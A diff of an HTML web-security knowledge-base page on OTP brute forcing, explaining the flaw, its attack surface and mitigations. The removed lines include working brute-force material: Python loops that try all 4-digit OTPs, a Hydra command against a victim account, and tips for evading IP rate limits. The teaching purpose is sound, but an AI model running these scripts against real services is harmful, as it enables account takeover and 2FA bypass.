@@ -3,152 +3,101 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>OTP Brute Force | Web Security | Saikumar Raju</title>
+  <title>OTP Brute Force | Saikumar Infosec</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <style>/* same base styles */</style>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-high { background: rgba(255, 136, 0, 0.2); color: #ff8800; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; }
+    .content-section p, .content-section ul { color: var(--text-secondary); line-height: 1.7; margin: 0.75rem 0; padding-left: 1.5rem; }
+    .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 0.8rem; margin: 1rem 0; }
+    .payload-item { background: var(--bg-elevated); border: 1px solid var(--border); border-radius: 0.5rem; padding: 0.8rem; font-family: monospace; font-size: 0.72rem; word-break: break-all; }
+    .vulnerability-box { background: rgba(255, 136, 0, 0.1); border-left: 4px solid #ff8800; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box { background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+  </style>
 </head>
 <body>
-<nav class="navbar">...</nav>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+
 <main>
   <div class="container">
-    <div class="breadcrumb"><a href="../knowledge-base.html">Knowledge Base</a> / <a href="index.html">Web Security</a> / OTP Brute Force</div>
+    <div class="breadcrumb"><a href="../index.html">Home</a> / <a href="index.html">Web Security</a> / OTP Brute Force</div>
+
     <div class="page-header">
-      <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> High Severity | OWASP A07:2021</span>
-      <h1>📌 OTP Brute Force (Missing Rate Limiting)</h1>
+      <span class="severity-badge severity-high"><i class="fas fa-exclamation-triangle"></i> High Severity</span>
+      <h1>🟠 OTP Brute Force / Prediction</h1>
+      <div class="meta-grid">
+        <div style="padding:0.5rem;"><strong>CWE</strong><span style="color:var(--text-secondary)">CWE-307: Excessive Authentication Attempts</span></div>
+        <div style="padding:0.5rem;"><strong>OWASP</span><span style="color:var(--text-secondary)">A07:2021 Authentication Failures</span></div>
+      </div>
     </div>
-    <div class="content-section">
+
+    <div class="content-section" id="description">
       <h2>🧠 Description</h2>
-      <p><strong>What is the vulnerability?</strong></p>
-      <p>One‑Time Password (OTP) verification endpoint lacks rate limiting or account lockout. Attackers can brute force 4‑6 digit OTPs (10,000 to 1,000,000 combinations) using automated requests.</p>
-      <p><strong>Why does it occur?</strong></p>
-      <p>Developers assume OTPs are secure by design and forget to implement brute force protection.</p>
-      <p><strong>Security principle violated:</strong> Weak Authentication / Rate Limiting</p>
-      <p><strong>Real-world analogy:</strong> A padlock with a 4‑digit code that doesn't lock after wrong attempts – you can try all 10,000 combinations.</p>
+      <p>One-Time Passwords (OTP) can be brute forced due to lack of rate limiting, or predicted if the OTP generation algorithm is weak (e.g., time-based with low entropy).</p>
+      <div class="vulnerability-box">
+        <strong>Impact: Account Takeover, 2FA Bypass, Financial Fraud</strong>
+      </div>
     </div>
-    <div class="content-section">
-      <h2>🏷️ Classification</h2>
-      <ul>
-        <li><strong>Type:</strong> Authentication Bypass</li>
-        <li><strong>OWASP:</strong> A07:2021 – Identification and Authentication Failures</li>
-        <li><strong>CWE:</strong> CWE-307: Improper Restriction of Excessive Authentication Attempts</li>
-      </ul>
-    </div>
-    <div class="content-section">
+
+    <div class="content-section" id="attack-surface">
       <h2>🎯 Attack Surface</h2>
       <ul>
-        <li>✅ OTP verification endpoints (2FA, password reset, email verification)</li>
-        <li>✅ Mobile OTP login flows</li>
-        <li>✅ API endpoints that accept OTP codes</li>
-        <li>✅ Web forms with OTP input</li>
+        <li>SMS/Email OTP verification</li>
+        <li>TOTP (Google Authenticator) endpoints</li>
+        <li>Backup codes</li>
+        <li>Password reset OTP</li>
       </ul>
     </div>
-    <div class="content-section">
-      <h2>🔍 Detection Methodology</h2>
+
+    <div class="content-section" id="bypass-techniques">
+      <h2>⚡ Exploitation Techniques</h2>
       <ul>
-        <li>Request an OTP for your account.</li>
-        <li>Use Burp Intruder or a script to send multiple OTP guesses (e.g., 0000 to 9999).</li>
-        <li>If you find the correct OTP within a few thousand attempts, rate limiting is missing.</li>
-        <li>Check if account locks after X failures or if there's a CAPTCHA.</li>
+        <li>Brute force 4-6 digit OTPs (10000-1000000 combinations)</li>
+        <li>Race condition: send multiple OTPs simultaneously</li>
+        <li>Timing attack: analyze response times</li>
+        <li>OTP leakage in referrer/URL</li>
       </ul>
     </div>
-    <div class="content-section">
-      <h2>💣 Basic Payloads</h2>
-      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
-        <pre># Burp Intruder payload: 0000 to 9999
-POST /verify-otp
-otp=§0000§&phone=+1234567890
 
-# Python script
-import requests
-for otp in range(10000):
-    r = requests.post('https://target.com/verify', data={'otp': f'{otp:04d}'})
-    if 'success' in r.text:
-        print(f'Found OTP: {otp:04d}')
-        break</pre>
-      </div>
-    </div>
-    <div class="content-section">
-      <h2>🚀 Advanced Exploitation</h2>
-      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
-        <pre># Distributed brute force across multiple IPs (if IP‑based rate limiting exists)
-# Use proxychains or rotating VPNs
-
-# Time‑based attacks if OTP is valid for long period (e.g., 10 minutes)
-# 10,000 attempts / 10 minutes = 16.6 attempts/second – feasible</pre>
-      </div>
-    </div>
-    <div class="content-section">
-      <h2>🧪 Test Cases (STRICT)</h2>
-      <table class="test-cases">
-        <thead><tr><th>Step</th><th>Action</th><th>Expected</th><th>Actual</th></tr></thead>
-        <tbody>
-          <tr><td style="padding: 0.75rem;">1</td><td style="padding: 0.75rem;">Send 100 consecutive wrong OTPs</td><td style="padding: 0.75rem;">Account locked or rate limited</td><td style="padding: 0.75rem;">All attempts accepted</td></tr>
-          <tr><td style="padding: 0.75rem;">2</td><td style="padding: 0.75rem;">Brute force 4‑digit OTP (0000-9999) within 10 minutes</td><td style="padding: 0.75rem;">Should be impossible</td><td style="padding: 0.75rem;">Successful brute force</td></tr>
-        </tbody>
-      </table>
-    </div>
-    <div class="content-section">
-      <h2>⚙️ Exploitation Steps</h2>
-      <ol>
-        <li>Trigger OTP generation for a target account (phone/email).</li>
-        <li>Capture the OTP verification request.</li>
-        <li>Use Burp Intruder or custom script to iterate through all possible OTP values.</li>
-        <li>When the correct OTP is found, the response will indicate success.</li>
-        <li>Log in as the victim or reset their password.</li>
-      </ol>
-    </div>
-    <div class="content-section">
+    <div class="content-section" id="mitigation">
       <h2>🛡️ Mitigation</h2>
       <div class="mitigation-box">
-        <strong>✅ Implement rate limiting (e.g., 5 attempts per minute, 20 per hour).</strong><br>
-        <strong>✅ Lock out after 10 failed attempts (temporary or permanent).</strong><br>
-        <strong>✅ Use CAPTCHA after 3 failures.</strong><br>
-        <strong>✅ Increase OTP length to 8 digits (100 million combos).</strong><br>
-        <strong>✅ Use time‑based OTP (TOTP) with short validity (30–60 seconds).</strong><br>
-        <strong>✅ Implement exponential backoff for failed attempts.</strong>
+        <strong>✅ Lock account after 5-10 failed OTP attempts</strong><br><br>
+        <strong>✅ Implement rate limiting per session/IP</strong><br><br>
+        <strong>✅ Use 8+ digit OTPs with high entropy</strong><br><br>
+        <strong>✅ Add friction (delay, CAPTCHA) after failures</strong><br><br>
+        <strong>✅ Use HMAC-based TOTP (not time-only)</strong>
       </div>
     </div>
-    <div class="content-section">
-      <h2>🔓 Mitigation Bypass</h2>
-      <ul>
-        <li>If rate limiting is IP‑based, attackers can use IP rotation or botnets.</li>
-        <li>If lockout is based on account, attackers can target multiple accounts with same OTP.</li>
-      </ul>
-    </div>
-    <div class="content-section">
-      <h2>⚠️ Risk / Impact</h2>
-      <div class="vulnerability-box">
-        <strong>Severity: High</strong><br><br>
-        <strong>Impact:</strong> Account takeover, bypass 2FA, password reset compromise, financial fraud.
-      </div>
-    </div>
-    <div class="content-section">
-      <h2>📎 Proof of Concept (PoC)</h2>
-      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
-        <pre># Using Hydra to brute force OTP
-hydra -l victim@example.com -P otp_list.txt target.com http-post-form "/verify:otp=^PASS^:F=Invalid"
 
-# Simple Python script
-import requests
-for i in range(10000):
-    r = requests.post('https://target.com/verify', json={'otp': f'{i:04d}'})
-    if 'success' in r.text:
-        print(f'Valid OTP: {i:04d}')
-        break</pre>
-      </div>
-    </div>
-    <div class="content-section">
-      <h2>📚 References</h2>
-      <ul>
-        <li><a href="https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks" style="color: var(--primary);">OWASP – Blocking Brute Force</a></li>
-        <li><a href="https://cwe.mitre.org/data/definitions/307.html" style="color: var(--primary);">CWE-307</a></li>
-      </ul>
-    </div>
     <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Web Security</a>
   </div>
 </main>
-<footer><p>Saikumar Raju — Cybersecurity Consultant | OTP Brute Force Guide</p></footer>
-<script>/* same scripts */</script>
+
+<footer class="footer"><div class="container"><p>Saikumar Raju</p></div></footer>
+
+<script>
+document.addEventListener('DOMContentLoaded',function(){var t=document.getElementById('themeToggle');if(t)t.addEventListener('click',function(){document.body.classList.toggle('light');var i=t.querySelector('i'),s=t.querySelector('span');i.className=document.body.classList.contains('light')?'fas fa-sun':'fas fa-moon';s.textContent=document.body.classList.contains('light')?'Light':'Dark'})});
+</script>
 </body>
 </html>
